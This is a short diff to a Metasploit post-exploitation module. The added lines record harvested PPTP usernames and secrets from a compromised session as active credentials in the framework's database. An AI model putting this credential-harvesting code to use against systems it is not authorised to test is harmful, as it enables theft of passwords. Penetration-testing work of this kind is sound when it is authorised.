@@ -81,6 +81,15 @@ class Metasploit3 < Msf::Post
 			secret = (found[2] || '').strip
 			ip     = (found[3] || '').strip
 
+			report_auth_info({
+				:host   => session.sock.peerhost,
+				:port   => 1723, #PPTP port
+				:sname  => 'pptp',
+				:user   => client,
+				:pass   => secret,
+				:active => true
+			})
+
 			tbl << [client, server, secret, ip]
 		end
 
